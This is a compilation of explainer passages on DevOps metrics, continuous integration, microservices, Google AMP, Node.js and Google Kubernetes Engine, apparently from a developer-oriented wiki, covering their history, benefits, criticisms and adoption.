Ganglia is for cluster and grid monitoring .
Snort is for real - time security .
For logging , we have a logstash .
Monit does system monitoring and recovery .
Cloud providers offer their own monitoring tools : AWS CloudWatch from Amazon or StackDriver from Google .
DevOps has its beginnings at the O'Reilly Velocity conference where John Allspaw and Paul Hammond presented a talk titled 10 + Deploys a Day : Dev and Ops Cooperation at Flickr .
Even in these early days , the importance of metrics is realized .
Some metrics identified include CPU load , memory usage , network throughput , and aggregated job queue .
There 's a growing realization among practitioners that we can end up collecting a lot of wrong DevOps metrics .
It 's important to relate metrics to business values , needs or outcomes .
One such proposal is the value - based approach that measures how value flows through the DevOps pipeline .
DevOps metrics span several areas .
Source : Kowall 2017 .
Gartner published a report titled Data - Driven DevOps : Use Metrics to Guide Your Journey .
This report includes a pyramid of metrics for DevOps .
Continuous Integration ( CI ) is the practice of routinely integrating code changes into the main branch of a repository , and testing the changes as early and often as possible .
Ideally , developers will integrate their code daily , if not multiple times a day .
Martin Fowler , Chief Scientist at ThoughtWorks , has stated that Continuous Integration does n't get rid of bugs , but it does make them dramatically easier to find and remove .
Why do we need Continuous Integration ?
In the past , developers on a team might work in isolation for an extended period of time and only merge their changes to the master branch once their work was completed .
This made merging code changes difficult and time consuming , and also resulted in bugs accumulating for a long time without correction .
These factors made it harder to deliver updates to customers quickly .
With CI , each code change can potentially trigger a build - and - test process .
Testing has become an essential part of the building process .
Bugs , if any , are highlighted early before they get a chance to grow or become hard to trace .
Essentially , CI breaks down the development process into smaller pieces while also employing a repeatable process of building and testing .
What are the benefits of Continuous Integration ?
Among the many benefits of CI are the following : Shorter integration cycles Better visibility of what others are doing , leading to greater communication Issues are caught and resolved early Better use of time for development rather than debugging Early knowledge that your code works along with others ' changes Ultimately , enabling the team to release software faster How does Continuous Integration work ?
How CI works .
Source : AWS 2018 .
With continuous integration , developers frequently commit to a shared repository using a version control system such as Git .
Prior to each commit , developers may choose to run local unit tests on their code as an extra verification layer before integrating .
A continuous integration service automatically builds and runs unit tests on the new code changes to immediately surface any errors .
Continuous integration refers to the build and unit testing stages of the software release process .
Every revision that is committed triggers an automated building and test .
What are some CI tools and how to choose among them ?
Comparing some CI tools .
Source : Putano 2018 .
There are many solutions out there .
Some of them include Codeship , TravisCI , SemaphoreCI , CircleCI , Jenkins , Bamboo , and Teamcity .
Some factors to consider when selecting a tool include price ( commercial or free ) , features , ease of use , integration ( with other tools and frameworks ) , support ( commercial or community ) and more .
What are the challenges to Continuous Integration ?
To improve and perfect your CI , you need to overcome 3 major challenges : No Standalone Fresh Checkout : The single biggest hurdle to a smooth CI build is ensuring that your application 's tests can be run from a fresh code checkout ( e.g. a git clone ) .
This means that all of your app 's dependencies are either included in the checkout , or they 're specified and can be pulled in by a script in the checkout .
Unreliable Tests : Now that your app is set up with a single command , you 've built a foundation for effective CI .
The next challenge is to ensure that your test results are repeatable and reliable .
Intermittent or " expected " failures that persist for too long are pernicious .
Once the habit of treating failures as intermittent takes hold , legitimate errors often get ignored .
Obscure Build Results : Once you 've produced a reliable test suite , the next challenge is to get results quickly , take appropriate action on them , and distribute information to the people who matter .
How are Continuous Integration , Continuous Delivery , and Continuous Deployment practices related to one another ?
The CI pipeline leading to CD .
Source : Pittet 2018 .
Continuous integration leads to both continuous delivery and continuous deployment .
Continuous deployment is like continuous delivery , except that releases happen automatically .
More specifically , continuous integration requires automated testing to ensure that nothing is broken when new commits are made .
Continuous delivery takes this to the next step by automating the release process so that your customers get regular fixes and upgrades .
Continuous delivery still requires manual intervention to initiate the final deployment to production .
Continuous deployment automates this last step too .
There 's no " Release Day " as such .
Customers see a steady stream of improvements and this enables early feedback .
Since releases are small , they 're less risky and easier to fix .
Jeff Humble , author of the book Continuous Delivery , says this about Continuous Deployment . Essentially , it is the practice of releasing every good build to users .
Grady Booch first proposes the term Continuous Integration ( CI ) .
In 1994 , he used the term in his book Object - Oriented Analysis and Design with Applications .
Kent Beck and Ron Jeffries invented Extreme Programming ( XP ) while on the Chrysler Comprehensive Compensation System project .
Beck publishes about continuous integration in 1998 .
Extreme Programming embraces the practice of CI .
CruiseControl , one of the first open - source CI tools , has been released .
Logical comparison of monolithic vs microservices .
Source : Clover 2017 .
Microservice Architecture describes an approach where an application is developed using a collection of loosely coupled services .
Previously , applications were based on centralized multi - tier architecture .
This worked well in the age of mainframes and desktops .
But with cloud computing and mobile devices , the backend must be available at all times for a wide range of devices .
Bug fixes and features must be delivered quickly without downtime or deploying the entire application .
Microservices are independently deployable , communicating through web APIs or messaging queues to respond to incoming events .
They work together to deliver various capabilities , such as user interface frontend , recommendation , logistics , billing , etc .
Microservices are commonly run inside containers .
Containers simplify deployment of microservices , but microservices can run even without containers .
What are Microservices ?
What are microservices ?
Source : MuleSoft Videos 2018 .
A microservice is an autonomous independent service that encapsulates a business scenario .
It contains the code and state .
Usually a microservice even contains its own data store .
This makes it independently versionable , scalable and deployable .
A microservice is loosely coupled and interacts with other microservices through well - defined interfaces using protocols like http .
They remain consistent and available in the presence of failure .
A microservice is independently reasonable .
Each microservice can be scaled on its own without having to scale the entire app .
What are the types of Microservices ?
Stateless vs stateful microservices .
Source : Microsoft Docs 2017 .
Broadly , there are two types of microservices : Stateless : has either no state or it can be retrieved from an external store ( cache / database ) .
It can be scaled out without affecting the state .
There can be N instances .
Examples : web frontends , protocol gateways , etc .
A stateless service is not a cache or a database .
It has frequently accessed metadata , for instance , affinity and loss of a node is non - evident .
Stateful : Maintains a hard , authoritative state .
For large hyper - scale applications , the state is kept close to the computer .
N consistent copies achieved through replication and local persistence .
Example : database , documents , workflow , user profile , shopping cart , etc .
A stateful service consists of databases and caches and the loss of a node is a notable event .
It is sometimes a custom app that holds large amounts of data .
As a variation , one author has identified three types : stateless ( compute ) , persistence ( storage ) , aggregation ( choreography ) .
Aggregation microservices depend on other microservices , thereby have network and disk I / O dependence .
What are the types of microservices in layered architecture ?
Microservices layered architecture .
Source : Indrasiri 2017 .
When we look at microservices as a layered architecture , we can identify the following types : Core / Atomic services : Fine - grained self - contained services .
No external service dependencies .
Mostly business logic .
Often there are no network calls .
Composite / Integration Services : Business functionality composed of multiple core services .
Include business logic and network calls .
Implement routing , transformations , orchestration , resiliency and stability patterns .
often interface to legacy or proprietary systems .
API / Edge Services : A selected set of integration services and core services offered as managed APIs for consumers .
Implement routing , API versioning , API security and throttling .
How are microservices different from APIs ?
Microservices vs APIs explained .
Source : Clark 2021 .
APIs are not microservices and microservices are not the implementation of an API .
An API is an interface .
A microservice is a component .
The term " micro " refers to the component and not the granularity of the exposed interfaces .
Microservices can be used to expose one or more APIs .
However , not all microservice components expose APIs .
What 's the relationship between Microservices Architecture and Service Oriented Architecture ( SOA ) ?
Comparing architectures of SOA and microservices .
Source : Despodovski 2017 .
SOA and Microservice architecture relate to different scopes .
While SOA relates to enterprise service exposure , microservice architecture relates to application architecture .
Both try to achieve many of the same things ( creation of business functions as isolated components ) but on a different scale .
They differ in maintainability , granularity , agility , etc .
SOA is a very broad term and microservices is a subset of that usage .
Netflix noted that microservices are " fine - grained SOA " .
Microservices have been recognized as " SOA done right " .
Some microservice principles are really different to SOA : Reuse is not the goal : Reuse of common components is discouraged due to the dependencies it creates .
Reuse by copy is preferred .
Synchronous is bad : Making synchronous calls such as API or web services creates real - time dependencies .
Messaging is used whenever possible between microservices .
Service Discovery at run time : Components are assumed to be volatile .
So it 's often the clients ’ responsibility to find and even load balance across instances .
Data Duplication is embraced : Techniques such as event sourcing result in multiple independent " views " of the data , ensuring that microservices are truly decoupled .
What are the important principles to keep in mind while designing a Microservice Architecture ?
Broadly speaking , the following principles are good to know while designing a microservice architecture : Modelling around a Business Domain , Culture of Automation , Hide Implementation Details , Highly Observable , Decentralise all things , Isolate Failure , Consumer First , Deploy Independently .
What are the advantages of using a microservice architecture ?
Advantages span both development and operations .
Briefly , we note the following advantages : Build and operate service at scale , Improved resource utilisation to reduce costs , Fault isolation , Continuous Innovation , Small Focused Teams , Use of any language or framework .
Scalability comes because of the modularity that microservices enable .
Because of containers , microservices have become easier to deploy in various environments .
Because of the isolation of services , there 's also a security advantage : an attack on one service will not affect others .
Microservices are about code and development .
Containers are about deployment .
Containers enable microservices .
Containers offer isolated environments , thus making them an ideal choice for deploying microservices .
However , it 's possible to deploy microservices without containers .
For example , microservices can be deployed independently of Amazon EC2 .
Each microservice can be in its own auto - scaling group and scaled independently .
Why should I not adopt microservices for my app ?
Challenges with microservices .
Source : MacVittie 2018 .
Since applications are distributed across microservices , such distributed systems are harder to manage and monitor .
Operational complexity increases as the number of microservices and their instances increases , particularly when they are dynamically created and destroyed .
Network calls can be slow and even fail at times .
Being distributed , maintaining strong consistency is hard and application has to ensure eventual consistency .
Microservices require more time for planning and partitioning the app .
They should be designed with failure in mind .
When you are building a Minimum Viable Product ( MVP ) or experimenting to assess what works or can add value to business , then a monolithic approach is faster and easier .
Adopt microservices only when you need to scale after your idea and their business value is proven .
If you 're managing a legacy application , the effort to migrate to microservices might involve considerable cost .
The technology stack may be considerably larger than a monolithic app .
Applications have a great dependence on networking and its performance .
Microservices can be tested independently , but testing the entire application is more difficult .
Although not directly influencing the birth of microservices , it 's been noted that from an architectural / philosophical perspective , similar ideas existed in the 1970s : Carl Hewitt 's Actor Model ; or pipes in UNIX that connect many small programs , each of which did something specific rather than having a large complex program that did many things .
This is the decade when Service - Oriented Architecture ( SOA ) starts to gain wider adoption .
The term itself was first described by Gartner in 1996 .
The idea is to use services as isolated and independent building blocks that collectively make up an application .
Services are loosely bound together by a standard communications framework .
To enable applications to communicate with one another over a network , W3C standardizes SOAP .
Over the next few years , WSDL and UDDI will be standardized as well .
XML is the preferred format of communication .
During this decade , Web Services , a web - based implementation of SOA , has become popular over proprietary methods such as CORBA or DCOM .
Netflix redefines the way it develops apps and manages operations by relying completely on APIs .
This later developed into what we today call microservices .
The term microservices was discussed at a workshop of software architects near Venice , to describe a common architectural style that several of them were exploring at the time .
REST and JSON have become the de facto standards for consuming backend data .
These would later prove to be foundational for inter - service communication when building microservice - based apps .
Closely related to microservices , Docker , a computer program that performs operating - system - level virtualization ( containerization ) , is open source .
Kubernetes , a container orchestration system for automating deployment , scaling and managing containerized applications , is open source by Google .
The survey shows microservices entering mainstream adoption .
Source : NGINX 2015 .
An app developer survey from NGINX shows that microservices are entering the mainstream with about two - thirds either using or investigating them .
Adoption is higher for medium and small companies .
To acquire and retain consumers , publishers have realized that content alone is not enough .
To deliver rich user experiences , publishers therefore serve content along with interesting animations and engaging interactions .
This might work on desktops but not on mobile devices where processing is limited and network connections are slower .
Advertisements used for monetization might also worsen the experience .
This is where AMP fits in .
Accelerated Mobile Pages ( AMP ) is a library to create web pages that load almost instantaneously .
AMP pages are web pages built using HTML but with some constraints .
It 's supported by multiple platforms and browsers .
Developers can reuse their web skills to create AMP pages .
AMP is an open - source project started by Google .
It 's in active development and adoption is growing .
There 's also criticism that Google is trying to control the way the web evolves .
What 's the problem that AMP aims to solve ?
Intro to AMP .
Source : Google Chrome Developers 2016 .
In 2015 , Facebook launched Instant Articles .
Apple launched Apple News .
Google followed by launching AMP later that year .
These developments point to the fact that more and more users are accessing content from mobile devices , but their experience is marred by the complexity of web technologies and developers using them inefficiently .
Pages load slowly .
Content jumps around the page when big images arrive later , forcing rendering engines to recalculate the positioning of page elements .
Annoying ads distract users from the main content .
When users leave such pages , publishers miss out on readers and ad revenues .
Later research from 2016 also brought some insights about the mobile web .
53 % of users will leave a page that takes longer than 3 seconds to load .
On a 3 G connection , the average load time is 19 seconds .
Each page makes on average 214 server requests , half of which are ad related .
While the proprietary approaches of Facebook and Apple use native apps , AMP is a mobile web approach .
AMP leverages the maturity of the web and its standards .
If AMP is for mobile , is it irrelevant for desktop users ?
AMP was designed with the mobile web in mind , but it could just as well be used for desktops .
It 's good to think of AMP as mobile first rather than mobile only .
This means it 's easier to develop responsive web apps across devices using AMP .
In the early days of AMP , it made sense to have two versions of your site : non - AMP for desktops and the AMP for mobiles .
While this might have enabled initial faster adoption , this had the drawback of sharing links across AMP and non - AMP pages , or showing a mobile - only AMP page to desktop users .
The current suggestion is to have a single canonical AMP site that can be served to any device .
As of October 2018 , Google Search does not serve pages from AMP Cache when accessed by desktop users .
Does adopting AMP improve Google 's search engine ranking ?
Google will not rank a page higher just because it 's AMP .
At best , it will show a lighting - bolt icon next to the search result to indicate that it 's AMP and will be served fast from AMP Cache for mobile web users .
However , Google does rank pages higher because they load faster on mobiles .
This implies that having AMP is a good thing .
In fact , WompMobile has received a 12 % better ranking .
Could you point me to some example sites using AMP ?
The official AMP site has published some case studies .
This shows that AMP has been adopted by news publishers , advertisers and e - commerce sites .
Some of these include Readwhere CMS , Jagran New Media , CNBC , Wired , Gizmodo , The Washington Post , U.S. Xpress , Teads , Tokopedia , Carved , Wego , and Events Ticket Center .
Other noteworthy sites using AMP include Vox and Tencent for news ; Myntra and Magebit for e - commerce ; Tasty.co for food and recipes ; Iene for entertainment .
In February 2018 , AliExpress launched AMP - the first mobile site .
Mynet has built a Progressive Web App ( PWA ) that uses AMP pages .
Spiegel Daily and Tasty.co have built their entire site using AMP , rather than having separate pages for mobiles and desktops .
A number of platforms ( content , ads , analytics ) and vendors support AMP by providing custom AMP components or integrating AMP pages to their platforms .
Examples are Facebook Pixel , Parsely , Flipboard , Medium , Twitter , Reddit , Pinterest , Weibo , Drupal , Wordpress , Soundcloud , Vimeo , YouTube , and Dailymotion .
The biggest ones include Wordpress , Reddit , Bing , Ebay , Pinterest and Google .
What are the results after implementing AMP ?
The Washington Post reported +23 % of mobile search users returned within 7 days .
Gizmodo reported 80 % of traffic from AMP pages is new traffic and +50 % impressions .
Wired reported +25 % click through rates from search results .
Visitors to The Miami Herald spend 10 % more time when coming via AMP pages .
At the Events Ticket Center , page load times dropped from 5 - 6 seconds to less than a second .
At Myntra , India 's largest online fashion retailer , the bounce rate was reduced by 40 % .
At AliExpress , load times were reduced by 36 % , orders increased by 10.5 % and conversion rates by 27 % .
On the contrary , a Chartbeat study showed that only a third of publishers see an increase in traffic .
Rockstar Coders has said that AMP decreased conversions by 70 % .
It 's also been noted that results depend on how well AMP is implemented .
What are the essential AMP components ?
There are three core components of AMP .
Source : PCITS 2017 .
AMP consists of three core components : AMP HTML : This is HTML with restrictions .
Basic HTML is extended with custom properties and elements .
Custom elements are also called AMP HTML components .
With these , we can implement common patterns easily without losing performance .
AMP JS : This is the AMP runtime in JavaScript .
It renders AMP HTML fast .
It optimizes resource loading , including asynchronous loading of external resources .
Custom JavaScript is not allowed .
It does prepare for resources above the fold .
It precalculates the layout even before resources are loaded .
It minimized style recalculations .
It disables slow CSS selectors .
CSS must be inline and limited to 50 KB .
Only animations capable of GPU acceleration are allowed .
AMP Cache : To get content to users quickly , it is served using Google AMP Cache , a proxy - based content delivery network ( CDN ) .
Cache also does page validation .
This cache can be proactively updated via an API if the original content changes .
These components help AMP achieve its goals in the areas of content , distribution and advertising .
What 's the data flow for client - server interactions with AMP pages ?
A typical data flow with AMP .
Source : Enge 2017 .
When AMP pages are published , search engines and platforms will crawl and index them as usual .
For example , Google will identify these pages and caches them to its CDN .
When visitors search on Google , Google will mark these AMP pages on the search results page .
Meanwhile , Google will also download content in advance above the fold and prepare the page in anticipation of user click .
" Above the fold " means that only content visible on the device 's viewport on first load will be downloaded .
When the user finally clicks on the link on the search results page , the loading is fast .
Subsequent clicks on links shown on the served page will be served from the original domain .
They do not go via the AMP Cache , that is , the CDN .
However , Google Analytics has mechanisms in place to treat the session as the same one .
Could you list some AMP HTML components ?
AMP HTML components start with the prefix ` amp- ` .
For example , to include an image , use ` amp - img ` .
Some of them are built into the base library .
Others are extensions and must be explicitly included .
There are also experimental ones .
Without being exhaustive , we mention a few components : Ads & Analytics : amp - analytics , amp - experiment , amp - pixel Dynamic Content : amp - access , amp - bind , amp - form , amp - list Layout : amp - accordion , amp - carousel , amp - iframe , amp - layout , amp - sidebar Media : amp - audio , amp - img , amp - video , amp - youtube Presentation : amp - date - countdown , amp - fit - text , amp - font , amp - story Social : amp - facebook , amp - reddit What are the common criticisms of AMP ?
The main criticism is that Google is doing this to increase its ad revenues and get around ad blockers that 16 % of Americans use .
Caching and pre - loading are not exclusive to AMP .
It 's been said that all AMP pages look the same .
Cross - domain analytics is hard across AMP and non - AMP pages .
When served from AMP Cache , the URL that visitors see is Google 's , not the original domain URL .
There 's disagreement about the effectiveness of ad monetization via AMP pages .
Because ad formats are limited on AMP , monetization has been slow .
Despite this , publishers are sticking to AMP because they seem to have little choice : Google seems to rank AMP pages higher .
Some see AMP as further fragmenting the web .
Content must be formatted for the regular web , for Facebook Instant Articles , for AMP , and so on .
However , there 's been a change of mindset in which AMP can be served across all devices .
AMP does not respect the platform on which pages are rendered .
For example , scrolling on iOS is unnatural or searching on the Safari browser does n't work .
Hence , Google is really breaking the open web .
I already have a full - fledged site .
How should I adopt AMP ?
Creating an AMP page is n't about removing some things from the original page to make it faster .
It 's about serving the same content but in a manner that conforms to the rules of AMP .
Among the errors that new developers make are using disallowed tags / attributes , and invalid / missing URLs .
On sites such as WordPress , there are plugins to convert existing pages to AMP .
By applying suitable customizations to the plugins , this can be an easy route to adopting AMP .
Hand - coded AMP pages will give better user engagement .
Do this first for important pages that are reached via search engines or other platforms .
When users are navigating within your domain , target pages will not benefit from the AMP Cache .
This is where the use of Service Workers and Progressive Web Apps ( PWA ) can help .
In fact , AMP can work nicely with PWA .
Developers can choose from a few options .
What are some AMP resources for beginners ?
The main AMP website is a good starting point for documentation , tutorials , guides and case studies .
It also has the AMP Validator .
To learn AMP via code samples , AMP By Example is a useful resource .
To complete your project by reusing AMP templates , AMP Start is the place to find them .
AMP Blog is the place to track the latest news and updates .
Since the project is open source , the AMP code is available on GitHub .
Guides are available to help you integrate your AMP pages across various Google products .
AMP logo .
Source : AMP Project 2018a .
Google announced Accelerated Mobile Pages ( AMP ) as an open source initiative to load content and ads faster on the mobile web .
Google Search has integrated with AMP pages , with Google News to follow soon .
About 30 publishers are partnering with Google to integrate AMP HTML pages .
AMP brings in support for paywalls and subscriptions .
Publishers retain control of the sign up and login process .
This is also the time when AMP pages are highlighted by Google Search as Top Stories carousel .
The Google Search results page has now started to surface AMP pages in standard search results .
This means that these results link to validated AMP pages rather than to the original domain .
Baidu , Sogou and Yahoo Japan launched AMP support .
Cloudflare launches an AMP cache .
Google Analytics enhances AMP support so that user sessions can be correctly tracked across AMP and non - AMP pages when served from the original domain .
Meanwhile , Facebook announced that Facebook Instant Articles can also be published as AMP pages .
This is to address publishers ' frustration of having to format content for different platforms .
Google introduces AMP Client ID API .
Using this , Google can determine if a user arriving at the original domain is coming from an AMP page served by Google from AMP cache .
This gives more accurate analytics in terms of unique users , session time , bounce rate , etc .
In September 2018 , this was further enhanced using AMP Linker .
More than 4 billion pages and 25 million website domains are using AMP .
The median time to load an AMP page via Google search is less than a second .
A study by Forrester Consulting reports that AMP leads to +10 % of traffic with 2x time spent on page .
For e - commerce sites , there 's +20 % sales conversions compared to non - AMP pages .
On GitHub , the project has more than 10k stars .
The project announces AMP Stories as a format for visual storytelling on the web .
It also announces AMP for Email .
Meanwhile , Google 's earlier announcement of " same content " policy comes into effect .
This requires that AMP pages have the same content as the original pages ( also called canonical pages ) .
This is to discourage publishers showing just a teaser on AMP pages and then asking users to navigate to the canonical pages .
Bing launches an AMP viewer and AMP cache .
Node.js logo .
Source : Node 2018a .
Since its birth in 1995 , JavaScript has established itself as the de facto programming language on the client side of a web application .
It executes within a web browser and thereby delivers more dynamic content and makes the user 's experience more interactive .
However , to execute code on the server side , we had PHP , ASP , Perl , Python , etc .
Until Node.js , there was no popular JavaScript support on the server side .
Node.js is a JavaScript runtime that can be executed on servers , that is , outside a web browser environment .
By default , it 's based on Google 's V8 JavaScript engine .
It 's open - source and cross platform .
It 's steered by the Node.js Foundation .
Node.js adopts an event - driven architecture and asynchronous I / O. This enables it to scale better , particularly for real - time web apps or apps that do a lot of I / O. The Node.js ecosystem includes thousands of packages and frameworks .
What 's the context for the creation of Node.js ?
How Node.js works .
Source : Hamedani 2018 .
The web was invented based on the client - server model .
Clients ( such as web browsers ) request the server for a resource .
The server serves the content as a response .
In this model , the server can not initiate a response .
Even if data has changed on the server , it has to wait for the client to give a request .
This was alright when users were passive consumers of information .
When social sites such as Facebook and Twitter arrived , everyone became a potential producer of information .
There was a rise in chat apps , multi - user gaming and apps for real - time collaboration .
We needed a method for servers to push data to clients .
While Flash and Java Applets enabled this , they were isolated environments that used non - standard ports .
Secondly , typical web servers launch a new thread to handle every client request .
This means that scalability is limited by memory and the penalty of switching across threads .
Node.js solves these problems by using single - threaded event - driven processing .
It offloads I / O tasks to worker threads and processes them asynchronously via callbacks .
Ultimately , this makes it easier for us to develop scalable real - time apps .
What sort of applications can benefit from Node.js ?
Node.js development focus , 2018 survey .
Source : Node 2018b .
Node.js is suited for apps that have lots of database access or wait on network connections .
When there 's a need to scale your app to thousands of parallel requests , Node.js does this well without hitting performance limits .
On the flip side , Node.js is not suited for CPU - intensive tasks , which will block the main thread .
With Node.js , stream processing of data is possible .
Worker threads do this processing .
It 's also good for queueing inputs for later batch processing .
Node.js with Socket .
IO makes it easy to build real - time apps such as chat apps or games .
It can be used as a proxy to handle many simultaneous connections .
Apps with rich real - time dashboards can be created .
Microservice architecture can be implemented with Node.js .
If your codebase spans both client and server concerns , Node.js helps you to write in a single language , JavaScript .
This makes it easier to later refactor the code if necessary .
JavaScript is a natural fit for transferring JSON data or working with object databases such as MongoDB without the extra processing of encoding or decoding .
How does Node.js work under the hood ?
The Event loop hands over slow tasks to the worker pool and executes callbacks .
Source : Gopi 2016 .
When a Node app starts , callbacks are registered for events .
A callback is nothing more than executable code that must be called when the event occurs .
After this initialization phase , the Node enters the Event Loop .
In this loop , the Node waits for events to happen and triggers the appropriate callbacks .
It 's for this reason , Node.js is said to use an event - driven programming paradigm .
For example , a client requests a web page .
The event loop will invoke the associated callback .
This is synchronous : the event loop will wait for the callback to complete .
However , if the callback requires some data from a database , the event loop being a single thread , will get blocked since I / O is slower compared to the CPU .
Other events will start queueing up .
To prevent this , Node.js adopts non - blocking asynchronous I / O : slow tasks will be handed over to the Worker Pool .
This frees the event loop to move on to the next event .
When a worker completes its task , it will signal an event , at which point , the event loop will process its callback synchronously .
Could you share more details about the event loop ?
The event loop consists of phases .
Source : Khan 2017 .
An event loop is also called main loop , main thread , or event thread .
It 's where code executes synchronously , that is , the event loop will wait until execution completes .
If there are asynchronous calls to be made , event loop will register their callbacks and handover the tasks to the worker pool .
The idea is to perform only lightweight tasks on the event loop so that it can handle as many requests as possible .
Throughput ( requests per second ) is an important concern for the event loop .
It 's important to note that the application and the event loop run within a single thread .
All events are processed in the same thread .
Pending events are not stored in a single queue .
Rather , the event loop is a set of phases , with each phase having events queued for processing .
Could you share more details about workers ?
Worker Pool manages a number of threads that can be used for both I / O - intensive or CPU - intensive tasks .
The worker pool maintains a queue of tasks to be processed .
When a worker becomes available , they are assigned a task .
Both event loop and worker threads make use of ` libuv ` , a multi - platform support library for asynchronous I / O. It 's implemented in C. Since operating systems often provide asynchronous interfaces , libuv will use these in preference to its own thread pool .
Since Node v10.5.0 , on an experimental basis , it 's been possible to create pools , specify the number of workers or have control of one worker communicating with another .
This is part of the ` worker - threads - pool ` package .
For my next web app , should I use Node.js or Express.js ?
Express is a web application framework built on top of Node .
You can build a web app with either of these , but development will be faster when built with Express .
Even better is to adopt the MEAN stack .
This is a technology stack that combines MongoDB , Express , Angular and Node .
Having said this , developers have a choice .
Express is not the only Node.js framework .
Others include hapi , koa or sails .
For fullstack , Meteors , Feathers or Keystone are alternatives to MEAN .
What if you 're building a REST API ?
In this case , performance is important .
Express may be too heavy and slow for building REST API endpoints or an API gateway .
You could use Node directly , but there are Node frameworks that are minimalistic and optimized for REST APIs : fastify , restana , restify , koa , polka .
What are some success stories with Node.js adoption ?
Paypal built a Node.js app in half the time with 33 % fewer lines of code compared to its Java codebase .
LinkedIn 's mobile app using Node.js backend is 20x faster and uses only 3 servers compared to 30 that Ruby on Rails needed .
At Netflix , Node.js has reduced app startup time by 70 % .
Groupon web pages are 50 % faster with Node.js compared to Rails .
They can also get much more traffic .
At GoDaddy , they now require 10x fewer servers and the time - to - first - byte is down to 12ms from 60ms .
Uber is able to process 2 million remote procedure calls per second , thanks to Node.js .
Medium is now able to deploy faster .
At NASA , by moving to a single database and Node.js they reduced access times by 300 % .
What are some useful resources for a Node.js developer ?
Guides and official documentation are available from the main Node.js site .
For the latest news , you can follow the Node.js Foundation website .
The Foundation 's site includes resources and case studies .
Among the package managers for Node.js are npm and yarn .
As of October 2018 , the npm site hosts about 800,000 JavaScript packages .
Node Frameworks gives a list of frameworks to consider .
To install and manage multiple versions of Node , use Node Version Manager ( NVM ) .
A video series by Net Ninja titled Node JS Tutorial for Beginners is a good place to start for beginners .
A curated list of Node.js resources is available from Angular Minds .
Netscape Communications and Sun Microsystems announce JavaScript to the world .
This includes Netscape LiveWire that allows server - side execution of JavaScript .
Hence , Node.js is certainly not the first to enable server - side JS execution .
Ryan Dahl and others at Joyent developed Node.js with initial support for only Linux .
The name Node was coined in March .
Being open source , version 0.1.0 was released on GitHub in May. In November , Ryan Dahl presented Node.js at JSConf in Berlin .
As a web development framework based on Node.js , Express.js is released .
For real - time event - based communication , Socket .
IO is released .
To manage packages for Node.js , Node Package Manager ( NPM ) has been released .
An early preview of NPM can be traced to 2009 , by Isaac Z. Schlueter .
The Node.js community is split , with the fork named io.js .
This is because some feel that Node.js updates are slow , and even after five years , the library is still at version 0.x .
Some also note that Node.js is controlled by Joyent and it 's less open than desired .
In January 2015 , v1.0.0 of io.js was released .
Joyent , IBM , Microsoft , PayPal , Fidelity , SAP and The Linux Foundation come together to establish the Node.js Foundation .
The Foundation will see that Node.js is managed in a more open manner and has regular releases .
In June , the Linux Foundation announced that Node.js and io.js will merge their codebases .
Version 4.0 has been released .
This is a combined release of both Node.js and io.js .
It includes many ES6 features .
Thus , the much awaited version 1.x of Node.js does not happen .
Version 4.0 is so , probably because the last version of io.js is v3.3.1 .
Node.js v4.2.0 " Argon " is released as the first Long Term Support ( LTS ) release .
This means that it will be supported for 30 months .
Microsoft releases and open sources ChakraCore , a JavaScript engine for Node.js .
This is , therefore , an alternative to the V8 engine that 's been the main runtime since the birth of Node.js .
Developers at Facebook released Yarn as an alternative to npm .
Node.js is seen to have reached mainstream adoption .
Online instances reach 8.8 million with 3 billion npm packages downloaded per week .
Node.js has been downloaded 25 million times this year , including a million in a single day .
With Node.js version 9 , HTTP/2 is now supported .
This has been available since July 2017 on an experimental basis .
Google Kubernetes Engine logo .
Source : CNCF 2018b .
Google Kubernetes Engine ( GKE ) is a managed environment for deploying , managing and scaling containerized applications using the Google Cloud Platform infrastructure .
The environment that Google Kubernetes Engine provides consists of multiple machines , specifically Google Compute Engine instances , which are grouped together to form a cluster .
Google Kubernetes Engine draws on the same reliable infrastructure and design principles that run popular Google services and provides the same benefits like automatic management , monitoring and liveness probes for application containers , automatic scaling , rolling updates , and more .
Why should I use Kubernetes ?
Before managing applications with Kubernetes and GKE , you should know how containers work and what advantages they provide .
If you were to build an online retail application with user sign - in , inventory management , billing and shipping , you could break up your application into smaller modules called microservices .
These are isolated and elastic , for high availability and scalability .
Containers provide the environment to deploy microservices .
You can run them on the same or even different machines , start and stop them quickly , but you ca n't specify how many machines or containers to keep running .
What to do if containers fail ?
How to connect a container to other containers and enable persistent storage ?
For these aspects , you need a container orchestration system like Kubernetes .
Kubernetes is an open source orchestrator for a container environment .
It provides the ability to define how many machines to use , how many containers to deploy , how to scale them , where the persistent disks reside , and how to deploy a group of containers as a single unit .
Since Kubernetes is already open source , what 's the need for GKE ?
GKE is a balance between the control of GCE and the fully managed service of Google App Engine .
Source : Google Cloud 2018a .
When you use GKE to setup a cluster , you also gain the benefit of advanced cluster management features that Google Cloud Platform provides .
These include : Leverage CI / CD tools in GCP to help you build and serve application containers Use Google Cloud Build to build container images from various source code repositories Use Google Container Registry to store and serve your container images Load balancing for Google Compute Engine instances Node pools to designate subsets of nodes within a cluster for additional flexibility Automatic scaling of your cluster 's node instance count Automatic upgrades for your cluster 's node software Node auto - repair to maintain node health and availability Logging and monitoring with Operations ( formerly Stackdriver ) for visibility into your cluster How does GKE work ?
Illustrating a GKE cluster .
Source : Moudgil 2017 .
A cluster is the foundation of GKE .
The Kubernetes objects that represent containerized applications all run within the cluster .
A cluster consists of at least one cluster master and multiple worker machines called nodes , which are the worker machines that run containerized applications and other workloads .
The worker machines are Google Compute Engine ( GCE ) instances that GKE creates on your behalf when you create a cluster .
These master and node machines run the Kubernetes cluster orchestration system .
The cluster master runs the Kubernetes control plane processes , including the Kubernetes API server , scheduler , and core resource controllers .
The API server process is the hub for all communication for the cluster .
All internal cluster processes ( such as the cluster nodes , system and components , application controllers ) all act as clients of the API server ; the API server is the single " source of truth " for the entire cluster .
What are some criticisms of GKE ?
GKE is still considered new .
Documentation and support could be improved .
It 's also not well integrated into the rest of Google Cloud Platform .
On a more technical note , some complain that the configurability of GKE is limited , including limited control on authentication , authorization or admission control .
It 's expected that future versions of GKE will give users more control , such as via ` ConfigMaps ` .
The first public commit of Kubernetes code is made on GitHub .
A few days later , it was released to the world at DockerCon .
Version 1.0 of Kubernetes was released at the Open Source Convention ( OSCON ) .
With Kubernetes as its first project , Cloud Native Computing Foundation ( CNCF ) was founded .
Google offers its own Google Kubernetes Engine ( GKE ) as a service for cluster management .
Similar services from Microsoft and Amazon follow .
As an alpha release , Google releases GKE On - Prem so that enterprises can deploy GKE in their own data centers .
This allows Google to offer a hybrid cloud platform .
Load balancing based on pods rather than only VMs .
Source : Pattan and Xia 2018 .
